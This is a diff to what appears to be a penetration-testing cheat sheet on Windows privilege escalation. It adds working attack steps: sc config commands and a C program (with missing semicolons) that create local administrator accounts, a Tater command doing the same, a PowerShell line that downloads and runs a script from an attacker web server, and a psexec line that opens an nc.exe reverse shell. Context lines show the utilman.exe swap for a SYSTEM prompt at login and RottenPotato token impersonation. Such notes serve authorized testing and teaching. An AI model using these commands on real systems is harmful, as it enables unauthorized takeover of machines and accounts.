@@ -77,7 +77,8 @@ passwords is as follow:
 
   1. Download Rufus and PCUnlocker
   2. Create a bootable USK key using Rufus with the PCUnlocker ISO.  
-     If making an USB key for a computer with UEFI BIOS, pick the "GPT partition scheme for UEFI computer" option on Rufus
+     If making an USB key for a computer with UEFI BIOS, pick the "GPT partition
+     scheme for UEFI computer" option on Rufus
   3. Boot on the USB Key thus created (boot order may need to be changed in BIOS)
   4. From the PCUnlocker GUI, pick an account and click the "Reset Password"
      button to reset the password to "Password123"
@@ -100,7 +101,8 @@ The procedure to do so is as follow:
      to a CD/DVD
   2. Boot on the thus created CD/DVD
   3. Pick the "Repair your computer" option
-  4. Select the “Use recovery tools [...]" option, pick the operating system from the list and click "Next"
+  4. Select the “Use recovery tools [...]" option, pick the operating system
+     from the list and click "Next"
   5. A command prompt should open, enter the following commands:
       - cd windows\system32
       - ren utilman.exe utilman.exe.bak
@@ -108,7 +110,8 @@ The procedure to do so is as follow:
   6. Remove the CD/DVD and boot the system normally.
   7. On the login screen, press the key combination Windows Key + U
   8. A command prompt should open with NT AUTHORITY\SYSTEM rights
-  9. Change a user password (net user <USERNAME> <NEWPASSWORD>) or create a new user
+  9. Change a user password (net user <USERNAME> <NEWPASSWORD>) or create a new
+  user
 
 
 #### File system & registry
@@ -202,7 +205,7 @@ The following files may contains sensible information:
 
 #### Unpatched system
 
-###### OS and Kernel vulnerabilities
+###### OS and Kernel version
 
 The following commands or actions can be used to get the updates installed on
 the host:
@@ -212,6 +215,8 @@ the host:
 | systeminfo<br/> Check content of C:\Windows\SoftwareDistribution\Download<br/>type C:\Windows\WindowsUpdate.log | Get-HotFix | wmic qfe get Caption,Description,HotFixID,InstalledOn |
 
 Automatically compare the system patch level to public known exploits:
+
+###### Exploits detection tools
 
 *Windows Exploit Suggester*
 
@@ -271,6 +276,20 @@ msf post(local_exploit_suggester) > set SESSION <session-id>
 msf post(local_exploit_suggester) > run
 ```
 
+###### Compilers
+
+*mingw*
+
+C code can be compiled on Linux for Windows using the  cross-compiler mingw:
+
+```
+# 32 bits
+i686-w64-mingw32-gcc -o exploit.exe exploit.c
+
+# 64 bits
+x86_64-w64-mingw32-gcc -o exploit.exe exploit.c
+```
+
 *PyInstaller*
 
 If an exploit is only available as a Python script and Python is not installed
@@ -300,27 +319,82 @@ Ubiquiti UniFi Video
 
 ###### Weak services permissions
 
+A weak service permissions vulnerability occurs when an unprivileged user can
+alter the service binary so that the service runs a specified command or
+executable.  
+
+The accesschk tool, from the Sysinternals suite, can be used to list the
+services an user can modify:
+
+```
+accesschk.exe -accepteula -uwcqv <USERNAME> *
+
+# Shows which services can be altered by everyone
+accesschk.exe -uwcqv "Everyone" *
+
+# Shows groups which can alter the service
+accesschk.exe -accepteula -uwcqv *
+```
+
+The exploitable permissions are:
+
+```
+SERVICE_CHANGE_CONFIG
+SERVICE_ALL_ACCESS F
+GENERIC_WRITE / GW
+GENERIC_ALL / GA
+WRITE_DAC / WDAC
+WRITE_OWNER / WO
+```
+
+To alter the service configuration:
+
+```
+sc config <SERVICENAME> binPath=net localgroup administrators <USERNAME> /add
+sc config <SERVICENAME> binPath=<NEWBINPATH>
+```
+
 ###### Unquoted services path
 
 When a service path is unquoted, the Service Manager will try to find the
 service binary in the shortest path, moving up to the longest path until one
 works.     
-For example, in the case of the path C:\Service Folder\Service.exe, the space
+For example, for the path C:\Service Folder\Service_binary.exe, the space
 is treated as an optional path to explore for that service. The resolution
-process will first look into C:\Service for the Service.exe binary and, if it
-exist, use to start the service.    
-In summary, a service is vulnerable if the path to the executable has a space
-in the filename and the file name is not wrapped in quote marks; exploitation
-requires write permissions to the path before the quote mark. If a service is
-vulnerable, it can be leveraged to escalate privileges to the level of the
-account that starts the service.  
+process will first look into C:\ for the Service.exe binary and, if it
+exist, use it to start the service.  
 
-To find vulnerable services the PowerUp script the
+Here is Windows’ chain of thought for the above example:
+
+1. Are they asking me to run  
+   "C:\Service.exe" Folder\Service_binary.exe  
+   No, it does not exist.
+
+2. Are they asking me to run  
+   "C:\Service Folder\Service_binary.exe"  
+   Yes, it does exist.
+
+In summary, a service is vulnerable if the path to the executable contains
+spaces and the path is not wrapped in quote marks ; exploitation
+requires write permissions to the path before the quote mark.
+
+In the example, if an attacker has write privilege in C:\, he could create a
+C:\Service.exe and escalate its privileges to the level of the account that
+starts the service.  
+
+To find vulnerable services the wmic tool, the PowerUp script and the
 exploit/windows/local/trusted_service_path metasploit module can be used as
-well the following commands:
+well as a manual review of each service metadata using sc queries:
 
 ```
+# List services
+sc query
+# Specified service metadata
+sc qc <SERVICENAME>
+
 # wmic
+wmic service get PathName, StartMode | findstr /i /v """
+wmic service get PathName, StartMode | findstr /i /v "C:\\Windows\\" | findstr /i /v """
 wmic service get name.pathname,startmode | findstr /i /v """
 wmic service get name.pathname,startmode | findstr /i /v """ | findstr /i /v "C:\\Windows\\"
 
@@ -333,11 +407,37 @@ Get-ServiceUnquoted
 exploit/windows/local/trusted_service_path
 ```
 
-###### Update and restart service
 
-To modifiy a service binary:
 
-To restart a service:
+###### Exploit and restart service
+
+*Add a local administrator user*
+
+The following C code can be used to add a local administrator user:
+
+```
+#include <stdlib.h>
+
+
+int main() {
+  int i;
+  i = system("net user TMP_Account <PASSWORD> /add")
+  i = system("net localgroup administrators TMP_Account /add")
+  return 0;
+}
+```
+
+The C code above can be compiled on Linux using the  cross-compiler mingw (refer
+  to cross compilation above).
+
+*Reverse shell*
+
+The service can be leveraged to start a privileged reverse shell. Refer to the
+General/Shells page (# Binary).  
+
+*Service restart*
+
+To restart the service:
 
 ```
 # Stop
@@ -350,10 +450,11 @@ Start-Service -Name <SERVICE>
 ```
 
 
-
 #### AlwaysInstallElevated
 
 #### Token Privileges abuse
+
+###### Vulnerable privileges
 
 Use the following command to retrieve the current user account token privileges:
 ```bash
@@ -371,7 +472,7 @@ The following tokens can be exploited to gain SYSTEM access privileges:
 - SeTakeOwnershipPrivilege
 - SeDebugPrivilege
 
-*Rotten Potato w/ Metasploit*
+###### Rotten Potato x64 w/ Metasploit
 
 RottenPotato can be used in combination with the Metasploit meterpreter
 incognito module to abuse the privileges above in order to elevate privilege to
@@ -388,7 +489,6 @@ meterpreter > load incognito
 meterpreter > upload MSFRottenPotato.exe .
 
 # The command may need to be run a few times
-meterpreter > execute -f 'MSFRottenPotato.exe'
 meterpreter > execute -f 'MSFRottenPotato.exe' -a '1 cmd.exe'
 
 # The NT AUTHORITY\SYSTEM token should be available as a delegation token
@@ -397,7 +497,36 @@ meterpreter > list_tokens -u
 meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
 ```
 
-*LonelyPottato (RottenPotato w/o Metasploit)*
+###### LonelyPottato (RottenPotato w/o Metasploit)
+
+###### Tater
+
+Tater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation exploit.
+
+```
+# Import module (Import-Module or dot source method)
+Import-Module ./Tater.ps1
+. ./Tater.ps1
+
+# Trigger (Default = 1): Trigger type to use in order to trigger HTTP to SMB relay.
+0 = None, 1 = Windows Defender Signature Update, 2 = Windows 10 Webclient/Scheduled Task
+
+Invoke-Tater -Command "net user <USERNAME> <PASSWORD> /add && net localgroup administrators <USERNAME> /add"
+
+# Memory injection and run
+powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Tater.ps1'); Invoke-Tater -Command <POWERSHELLCMD>;
+```
+
+#### Credentials re-use
+
+To use another user credentials, psexec can be used to start a cmd shell or start a
+reverse shell:
+
+```
+# Use the -s option if the user provided is member of the administrators group
+psexec.exe -s -i -d -u <DOMAIN/LOCAL>\<USERNAME> -p <PASSWORD>
+psexec.exe -s -d -u <DOMAIN/LOCAL>\<USERNAME> -p <PASSWORD> <FULLPATH/nc.exe> -e cmd.exe <IP> <PORT>
+```
 
 ### Post-Exploit
 
@@ -420,7 +549,7 @@ an administrator account:
 # -i   Run the program so that it interacts with the desktop of the specified session on the remote system
 # -d   Don't wait for process to terminate (non-interactive).
 
-psexec.exe -s -i -d cmd.exe
+psexec.exe -accepteula -s -i -d cmd.exe
 ```
 
 If a meterpreter is being used, the **getsystem** command can be leveraged to achieve the same end.
